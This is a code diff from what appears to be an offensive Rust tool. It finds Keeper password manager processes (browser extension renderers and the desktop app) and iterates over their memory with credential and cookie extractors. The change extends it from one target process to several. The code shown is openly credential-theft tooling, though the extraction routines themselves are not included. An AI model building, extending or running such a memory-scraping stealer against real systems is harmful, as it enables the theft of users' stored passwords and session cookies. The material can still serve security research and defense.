@@ -3,39 +3,42 @@ use cli::{parse_args, Application};
 fn main() -> std::io::Result<()> {
     let args = parse_args();
 
-    let (process_id, extractors) = match args.application {
+    let (process_ids, extractors) = match args.application {
         Application::Msedge => {
             println!("[i] Scanning Microsoft Edge...");
-            println!("[i] Getting target PID");
-            let pid = enumerate::get_program_pid("msedge.exe", Some(r"--type=renderer --extension-process"));
+            println!("[i] Getting target PID(s)");
+            let pids = enumerate::get_program_pids("msedge.exe", Some(r"--type=renderer --extension-process"));
             let extractors: &[fn(&str, bool)] = &[extract::extract_credentials_chrome];
-            (pid, extractors)
+            (pids, extractors)
         }
         Application::Chrome => {
             println!("[i] Scanning Google Chrome...");
-            println!("[i] Getting target PID");
-            let pid = enumerate::get_program_pid("chrome.exe", Some(r"--type=renderer --extension-process"));
+            println!("[i] Getting target PID(s)");
+            let pids = enumerate::get_program_pids("chrome.exe", Some(r"--type=renderer --extension-process"));
             let extractors: &[fn(&str, bool)] = &[extract::extract_credentials_chrome];
-            (pid, extractors)
+            (pids, extractors)
         }
         Application::Desktop => {
             println!("[i] Scanning on the Desktop...");
-            println!("[i] Getting target PID");
-            let pid = enumerate::get_program_pid("keeperpasswordmanager.exe", Some(r"--renderer-client-id=4"));
+            println!("[i] Getting target PID(s)");
+            let pids = enumerate::get_program_pids("keeperpasswordmanager.exe", Some(r"--renderer-client-id=4"));
             let extractors: &[fn(&str, bool)] = &[
                 extract::extract_credentials_chrome,
                 extract::extract_cookies,
             ];
-            (pid, extractors)
+            (pids, extractors)
         }
     };
 
-    if let Some(pid) = process_id {
-        println!("[+] Keeper target PID Found: {}", pid);
-        println!("[i] Iterating over memory");
-        let _ = dump::iterate_over_mem(pid.as_u32(), extractors, args.verbose);
+    if !process_ids.is_empty() {
+        println!("[+] Found {} Keeper target PID(s).", process_ids.len());
+        for pid in process_ids {
+            println!("[+] Processing PID: {}", pid);
+            println!("[i] Iterating over memory for PID {}", pid);
+            let _ = dump::iterate_over_mem(pid.as_u32(), extractors, args.verbose);
+        }
     } else {
-        println!("[-] Could not find target PID");
+        println!("[-] Could not find any target PIDs");
     }
 
     Ok(())
